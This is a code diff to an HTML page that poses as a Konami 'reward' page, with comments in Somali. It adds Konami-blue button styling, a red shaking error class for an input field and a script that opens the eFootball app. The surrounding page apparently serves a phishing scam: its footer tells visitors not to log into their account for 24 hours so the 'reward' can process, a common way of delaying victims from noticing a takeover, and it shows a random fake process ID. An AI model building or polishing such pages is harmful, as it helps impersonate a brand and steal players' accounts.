@@ -88,6 +88,38 @@
             color: #777; 
             border-top: 1px solid #eee; 
         }
+                /* Badhanka Play Game ee Konami Style */
+.btn-konami-blue {
+    width: 100%;
+    background-color: #0041AD; /* Midabka Buluugga rasmiga ah ee Konami */
+    color: white;
+    border: none;
+    padding: 16px;
+    border-radius: 4px; /* Geesaha xoogaa yar oo wareeg ah */
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+/* Marka la gujiyo (Daboolis yar) */
+.btn-konami-blue:active {
+    background-color: #00338a;
+}
+
+/* Class-ka gariirka iyo guduudka sanduqa */
+.input-error-shake {
+    border: 2px solid #ff0000 !important;
+    background-color: #fff0f0 !important;
+    animation: shake-fast 0.2s ease-in-out 0s 2;
+}
+
+@keyframes shake-fast {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-8px); }
+    75% { transform: translateX(8px); }
+}
     </style>
 </head>
 <body>
@@ -137,6 +169,9 @@
         <p>&copy; 2026 Konami Digital Entertainment</p>
         <p style="margin-top: 10px;">Security Note: To ensure your reward is processed safely, please avoid logging into your account for the next 24 hours.</p>
     </footer>
+      <button type="submit" class="btn-konami-blue" id="playGameBtn">
+    PLAY GAME
+      </button>
 </div>
 <script>
     window.onload = function() {
@@ -156,6 +191,20 @@
         // Ku bandhig bogga dhexdiisa
         document.getElementById('dynamic-id').innerText = "Process ID: #" + randomID;
     };
+    // Koodhkan wuxuu furayaa eFootball App
+function openEFootball() {
+    // Kani waa link-ga rasmiga ah ee lagu furo eFootball (Android & iOS)
+    const playStoreLink = "https://play.google.com/store/apps/details?id=jp.konami.pesam";
+    const appScheme = "konami://pesam"; // Scheme-ka app-ka lagu kiciyo
+
+    // Isku day inaad furto App-ka
+    window.location.href = appScheme;
+
+    // Haddii app-ku uusan taleefanka ku jirin 2 ilbiriqsi ka dib, u dir Play Store
+    setTimeout(function() {
+        window.location.href = playStoreLink;
+    }, 2000);
+}
 </script>
 
 
